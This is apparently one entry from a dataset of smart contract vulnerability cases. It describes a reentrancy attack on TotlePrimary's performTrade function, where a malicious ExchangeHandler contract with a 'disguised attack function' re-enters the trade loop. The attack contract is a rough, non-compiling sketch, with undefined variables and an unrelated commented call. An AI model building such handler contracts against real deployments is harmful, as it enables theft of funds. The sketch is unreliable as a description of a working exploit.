# Attack11

### Contract Name:
TotlePrimary(test1645.sol„ÄÅtest3157.sol)
### Contract Address:



### Transaction Count:



### Involved Ethers:



### Length of the Call Chain: 

2 internal function 1 external function

### Victim Function:

`performTrade(TotlePrimary.Trade,TotlePrimary.TradeFlag,TotlePrimary.CurrentAmounts)`

### Attack Mechanism:

Attack code:

```javascript
contract ExchangeHandler {
    TotlePrimary t = new TotlePrimary();
    Trade trade = new Trade();
    constructor() payable {}
    function performBuyOrder() public payable {   // Disguised attack function
        //victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
        t.performTrade(trade, tradeFlag, amounts);
    }
    function() payable {
      
    }
    function getvalue() returns (uint) {
        return this.balance;
    }
}
contract Trade {
    //some code
}

```

Attacked code:

```javascript
contract TotlePrimary {
    ...
    function performTrade(
        Trade memory trade,
        TradeFlag memory tradeFlag,
        CurrentAmounts amounts
    )
        internal
    {
        /* logger.log("Performing trade"); */

        for (uint256 j; j < trade.orders.length; j++) {

            if(amounts.amountLeftToSpendOnTrade * 10000 < (amounts.amountSpentOnTrade + amounts.amountLeftToSpendOnTrade)){
                return;
            }

            if((trade.isSell ? amounts.amountSpentOnTrade : amounts.amountReceivedFromTrade) >= trade.tokenAmount ) {
                return;
            }

            if (tradeFlag.ignoreOrder[j] || amounts.amountLeftToSpendOnTrade == 0) {
                /* logger.log(
                    "Order ignore flag is set to true or have nothing left to spend arg2: amountLeftToSpendOnTrade",
                    amounts.amountLeftToSpendOnTrade
                ); */
                continue;
            }

            uint256 amountSpentOnOrder = 0;
            uint256 amountReceivedFromOrder = 0;

            Order memory thisOrder = trade.orders[j];

            /* logger.log("Setting order exchange handler arg6: exchangeHandler.", 0, 0, 0, 0, thisOrder.exchangeHandler); */
            ExchangeHandler thisHandler = ExchangeHandler(thisOrder.exchangeHandler);

            uint256 amountToGiveForOrder = Utils.min(
                thisHandler.getAmountToGive(thisOrder.genericPayload),
                amounts.amountLeftToSpendOnTrade
            );

            if (amountToGiveForOrder == 0) {
                /* logger.log(
                    "MASSIVE ERROR: amountToGiveForOrder was found to be 0, this hasn't been caught in preTradeChecks, which means dynamicExchangeChecks isnt written correctly!"
                ); */
                continue;
            }

            /* logger.log(
                "Calculating amountToGiveForOrder arg2: amountToGiveForOrder, arg3: amountLeftToSpendOnTrade.",
                amountToGiveForOrder,
                amounts.amountLeftToSpendOnTrade
            ); */

            if( !thisHandler.staticExchangeChecks(thisOrder.genericPayload) ) {
                /* logger.log("Order did not pass checks, skipping."); */
                continue;
            }

            if (trade.isSell) {
                /* logger.log("This is a sell.."); */
                if (!ERC20SafeTransfer.safeTransfer(trade.tokenAddress,address(thisHandler), amountToGiveForOrder)) {
                    if( !trade.optionalTrade ) errorReporter.revertTx("Unable to transfer tokens to handler");
                    else {
                        /* logger.log("Unable to transfer tokens to handler but the trade is optional"); */
                        return;
                    }
                }

                /* logger.log("Going to perform a sell order."); */
                (amountSpentOnOrder, amountReceivedFromOrder) = thisHandler.performSellOrder(thisOrder.genericPayload, amountToGiveForOrder);
                /* logger.log("Sell order performed arg2: amountSpentOnOrder, arg3: amountReceivedFromOrder", amountSpentOnOrder, amountReceivedFromOrder); */
            } else {
                /* logger.log("Going to perform a buy order."); */
                (amountSpentOnOrder, amountReceivedFromOrder) = thisHandler.performBuyOrder.value(amountToGiveForOrder)(thisOrder.genericPayload, amountToGiveForOrder);
                /* logger.log("Buy order performed arg2: amountSpentOnOrder, arg3: amountReceivedFromOrder", amountSpentOnOrder, amountReceivedFromOrder); */
            }


            if (amountReceivedFromOrder > 0) {
                amounts.amountLeftToSpendOnTrade = SafeMath.sub(amounts.amountLeftToSpendOnTrade, amountSpentOnOrder);
                amounts.amountSpentOnTrade = SafeMath.add(amounts.amountSpentOnTrade, amountSpentOnOrder);
                amounts.amountReceivedFromTrade = SafeMath.add(amounts.amountReceivedFromTrade, amountReceivedFromOrder);

                /* logger.log(
                    "Updated amounts arg2: amountLeftToSpendOnTrade, arg3: amountSpentOnTrade, arg4: amountReceivedFromTrade.",
                    amounts.amountLeftToSpendOnTrade,
                    amounts.amountSpentOnTrade,
                    amounts.amountReceivedFromTrade
                ); */
            }
        }


    ...
}
```

In this case, the goal of our reentrancy is `thisHandler.performBuyOrder.value(amountToGiveForOrder)(thisOrder.genericPayload, amountToGiveForOrder)` in the victim code. because `thisHandler` is tainted by `trade`.
**Attack.** The attacker call `performBuyOrder()` function to make `thisHandler` is attacker's address.